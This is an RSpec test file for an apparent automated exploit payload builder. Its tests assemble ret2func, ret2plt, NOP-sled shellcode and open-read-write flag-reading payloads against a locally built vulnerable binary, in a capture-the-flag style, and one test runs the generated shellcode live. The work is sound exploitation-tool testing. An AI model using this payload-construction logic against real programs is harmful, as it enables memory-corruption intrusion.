# frozen_string_literal: true

require "lictor"
require "tmpdir"

builder = ["../../augure/profiler/spec/support/binary_builder.rb",
  "../augure/profiler/spec/support/binary_builder.rb"]
  .map { |p| File.expand_path(p, __dir__) }
  .find { |p| File.file?(p) }
require_relative builder

RSpec.describe Lictor::PayloadBuilder do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }
  let(:out) { File.join(dir, "payload.bin") }

  it "builds the ret2func payload: measured padding + ret_align + the win address" do
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n" \
            "gadget(\"ret_align\", 4196100).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2func", out: out)
    expect(result[:offset]).to eq(16)
    expect(result[:offset_source]).to eq("static-frame")
    expect(result[:sink]).to eq("strcpy")
    expect(result[:ret_source]).to include("win_symbol:win")
    body = File.binread(out)
    expect(body).not_to include([4_196_100].pack("Q<")) # offset 16: already aligned, no gadget
    expect(body).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
  end

  it "builds the shellcode payload: sled + jmp_rsp + the assembled shellcode" do
    facts = "nx(\"false\").\ngadget(\"jmp_rsp\", 4196200).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
    expect(result[:ret_source]).to include("gadget:jmp_rsp")
    body = File.binread(out)
    expect(body).to start_with(("\x90" * result[:offset]).b)
    expect(body.bytesize).to be > result[:offset] + 8
    expect(result[:size]).to eq(body.bytesize)
  end

  it "uses a custom payload file verbatim for the shellcode template" do
    custom = File.join(dir, "custom.sc")
    File.binwrite(custom, "\xcc" * 11)
    facts = "gadget(\"jmp_rsp\", 99).\n"
    described_class.build(binary: binary, facts: facts, technique: "shellcode",
      out: out, payload_file: custom)
    body = File.binread(out)
    expect(body).to end_with(("\xcc" * 11).b)
  end

  it "refuses honestly when the facts cannot drive the template" do
    expect do
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "ret2func", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /win_symbol/)
    expect do
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "heap_tcache", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /layout/)
  end
end

RSpec.describe "the leaked-address slot" do
  let(:pb) { Lictor::PayloadBuilder }
  let(:dir) { Dir.mktmpdir }
  let(:binary) do
    builder = ["../../augure/profiler/spec/support/binary_builder.rb",
      "../augure/profiler/spec/support/binary_builder.rb"]
      .map { |p| File.expand_path(p, __dir__) }
      .find { |p| File.file?(p) }
    require_relative builder
    ProfilerBinaryBuilder.vulnerable
  end
  let(:out) { File.join(dir, "payload.bin") }

  it "builds from the addresses the service leaked" do
    facts = "nx(\"true\").\npie(\"false\").\ncanary(\"false\").\n" \
            "leaked_address(\"win\", 4196182).\n"
    result = pb.build(binary: binary, facts: facts, technique: "banner_leak", out: out)
    expect(result[:ret_source]).to include("leaked_address:win@4196182")
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
  end

  it "refuses when the service never leaked" do
    facts = "nx(\"true\").\n"
    expect do
      pb.build(binary: binary, facts: facts, technique: "banner_leak", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /harvest/)
  end
end

RSpec.describe "the pack build: section" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "a pack technique builds with ITS layout: gadget chain then win" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\ngadget(\"ret_align\", 4196100).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "chain_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_chain_probe", "head" => %w[applicable chain_probe],
                   "conditions" => [%w[fact target_function true]]}],
      "kb" => [{"id" => "x1", "description" => "x", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "chain_probe",
                  "layout" => [["padding"], ["qword", "gadget:ret_align"], ["qword", "win"]]}
    )
    result = Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "chain_probe", out: out, packs: [pack])
    body = File.binread(out)
    expect(body).to eq(("A" * 16).b + [4_196_100].pack("Q<") + [4_196_182].pack("Q<"))
    expect(result[:ret_source]).to include("gadget:ret_align")
  end

  it "a pack teaching a NEW technique gets its layout from the pack" do
    out = File.join(dir, "n.bin")
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "fancy_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_fancy", "head" => %w[applicable fancy_probe],
                   "conditions" => [%w[fact target_function true]]}],
      "kb" => [{"id" => "f1", "description" => "f", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "fancy_probe",
                  "layout" => [["padding"], %w[dword win]]}
    )
    Lictor::PayloadBuilder.build(binary: binary, facts: facts,
      technique: "fancy_probe", out: out, packs: [pack])
    # the dword slot is 4 bytes wide even on x64 (the width per slot)
    expect(File.binread(out)).to eq(("A" * 16).b + [4_196_182].pack("L<"))
  end
end

RSpec.describe Lictor::PayloadBuilder, "the chain slot" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "composes the ret2plt leak chain from the facts (gadget, got, plt)" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    body = File.binread(out)
    expected = ("A" * 16).b + [4_196_100, 4_196_112, 4_196_104].pack("Q<*")
    expect(body).to eq(expected)
    expect(result[:ret_source]).to include("gadget:pop_rdi_ret")
  end

  it "resolves const literals and refuses incomplete chains loudly" do
    out = File.join(dir, "c.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rdi_ret\", 4196100).\n" \
            "plt_addr(\"puts\", 4196104).\ngot_addr(\"puts\", 4196112).\n"
    pack = Augure::Pack.load_hash(
      "technique" => "chain_const_probe", "author" => "spec", "source" => "https://example.com",
      "rules" => [{"id" => "app_ccp", "head" => %w[applicable chain_const_probe],
                   "conditions" => [%w[fact nx true]]}],
      "kb" => [{"id" => "c1", "description" => "c", "success_rate" => 0.5}],
      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
      "priors" => [1, 1],
      "build" => {"technique" => "chain_const_probe",
                  "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "const:59", "plt_addr:puts"]]}
    )
    described_class.build(binary: binary, facts: facts, technique: "chain_const_probe", out: out, packs: [pack])
    body = File.binread(out)
    expect(body).to eq(("A" * 16).b + [4_196_100, 59, 4_196_104].pack("Q<*"))
  end

  it "refuses a chain whose gadget is not in the facts" do
    out = File.join(dir, "f.bin")
    facts = "nx(\"true\").\npie(\"false\").\ngadget(\"pop_rsi_ret\", 4196100).\n"
    expect do
      described_class.build(binary: binary, facts: facts, technique: "ret2plt", out: out)
    end.to raise_error(Lictor::PayloadBuilder::BuildError, /pop_rdi_ret/)
  end
end

RSpec.describe Lictor::PayloadBuilder, "the orw shellcode slot" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "an orw slot carries its flag path and reads it live" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"false\").\nleaked_address(\"input\", 4196300).\n"
    flag = File.join(dir, "flag.txt")
    File.write(flag, "FLAG{orw_slot}")
    result = described_class.build(binary: binary, facts: facts, technique: "orw",
      out: out, shellcode_path: flag)
    body = File.binread(out)
    # the orw stub embeds the flag path and the read marker
    expect(body).to include("flag.txt")
    expect(result[:ret_source]).to include("leaked_address:input@4196300")
    # live: run the stub, it prints the flag
    runner = File.join(dir, "sc_runner")
    src = ["../../augure/profiler/spec/support/sc_runner.c",
      "../augure/profiler/spec/support/sc_runner.c"]
      .map { |p| File.expand_path(p, __dir__) }
      .find { |p| File.file?(p) }
    skip "the augure checkout is not present" unless src
    _o, err, st = Open3.capture3("gcc", "-o", runner, src)
    raise "runner build failed: #{err}" unless st.success?

    code = body[(result[:offset] + 8)..] # after the sled + the jmp_rsp address
    out2, _e2, st2 = Open3.capture3(runner, stdin_data: code + "\nexit\n", chdir: dir)
    expect(out2).to include("FLAG{orw_slot}"), "the orw stub ran: #{out2[0, 80]}"
    expect(st2.success?).to be(true)
  end
end

RSpec.describe Lictor::PayloadBuilder, "seccomp-aware shellcode" do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }

  it "execve dies under seccomp: the sh stub becomes the orw chain" do
    out = File.join(dir, "p.bin")
    facts = "nx(\"false\").\nseccomp(\"true\").\ngadget(\"jmp_rsp\", 4196200).\n"
    described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
    body = File.binread(out)
    expect(body).not_to include("/bin/sh"), "the sh stub execve's into a killed process under seccomp"
    expect(body).to include("flag.txt"), "the orw stub reads the flag: the path is embedded"
  end
end
